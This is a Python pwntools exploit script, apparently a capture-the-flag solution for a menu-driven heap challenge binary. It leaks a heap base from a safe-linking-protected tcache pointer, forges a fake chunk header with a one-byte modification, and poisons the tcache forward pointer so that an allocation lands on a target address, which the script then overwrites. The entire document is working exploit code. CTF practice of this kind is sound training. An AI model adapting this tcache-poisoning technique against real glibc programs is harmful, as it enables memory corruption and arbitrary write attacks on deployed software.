#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = 'debug'


r = process([exe.path])
gdb.attach(r)

def alloc(index, size, data):
    r.sendlineafter(b'4.Change_byte', b'1')
    r.sendlineafter(b'Index: ', str(index).encode())
    r.sendlineafter(b'size: ', str(size).encode())
    r.sendafter(b'data: ', data)

def free(index):
    r.sendlineafter(b'4.Change_byte', b'2')
    r.sendlineafter(b'Index: ', str(index).encode())

def view(index):
    r.sendlineafter(b'4.Change_byte', b'3')
    r.sendlineafter(b'Index: ', str(index).encode())
    data = r.recvline()[:-1]
    return data

def modify_byte(index, b):
    r.sendlineafter(b'4.Change_byte', b'4')
    r.sendlineafter(b'Index: ', str(index).encode())    
    r.sendafter(b'byte: ', b)


def main():
    #get target address
    r.recvuntil(b'on ')
    target_addr = int(r.recvuntil(b'.', drop=True).decode(), 16)

    fake_header = flat(
        p64(0),
        p64(0x30)   #data space size = 0x20
    )

    alloc(0, 0x10, 'a'*0x10)
    alloc(1, 0x10, fake_header)
    alloc(2, 0x10, 'a'*0x10)

    # free two chunk to tcache
    free(0)
    heap_base = u64(view(0).ljust(8, b'\x00'))  #value: 0x0 ^ (heap_base >> 12), 
                                                #because no forward chunk (this is the only 0x10-size chunk in tcache)
    free(2)

    # modify the chunk pointer to fake chunk, and free the fake chunk
    modify_byte(1, b'\xd0')
    free(1)

    # alloc chunk again (and overwrite the fwd pointer of the chunk 2)
    payload = flat(
        p64(0),
        p64(0x21),
        p64(target_addr ^ heap_base),
        p64(0)
    )
    alloc(3, 0x20, payload)
    print(hex(heap_base))
    print(hex(target_addr ^ heap_base))

    # alloc two time (the second chunk in on the target address so we can just modify its data)
    alloc(4, 0x10, b'a'*0x20)
    alloc(5, 0x10, b"flag".ljust(0x10, b'\x00'))

    r.interactive()


if __name__ == "__main__":
    main()
